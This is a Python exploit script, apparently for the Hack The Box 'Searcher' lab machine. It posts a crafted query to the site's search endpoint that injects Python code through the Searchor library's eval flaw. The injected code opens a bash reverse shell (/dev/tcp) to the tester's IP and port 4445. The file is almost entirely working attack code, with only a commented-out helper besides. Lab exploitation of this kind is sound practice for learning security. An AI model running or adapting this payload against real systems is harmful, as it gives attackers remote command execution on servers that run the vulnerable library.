import subprocess

import requests


#
#
# def run_command(arg_list):
#     r = subprocess.run(arg_list, capture_output=True)
#     if r.stderr:
#         output = r.stderr.decode()
#     else:
#         output = r.stdout.decode()
#
#     return output
#
#
#
# arg_list = ['./full-checkup.sh']
# print(run_command(arg_list))
# print('[+] Done!')


URL = "http://searcher.htb/"

# Bash command to execute
bash_command = "bash -c 'bash -i >& /dev/tcp/10.10.14.56/4445 0>&1'"

# Wrapping the bash command in python code
py_statement = f'str(__import__("os").system("{bash_command}"))'

# Build payload (see https://github.com/ArjunSharda/Searchor/pull/130)
payload = f"aaa', copy_url={{copy}}, open_web={{open}}) + {py_statement} #"

# Send payload
data = {
    "engine": "Google",
    "query": payload,
}
res = requests.post(URL + "search", data=data)

# Print response
print(res.content)
print(res.status_code)
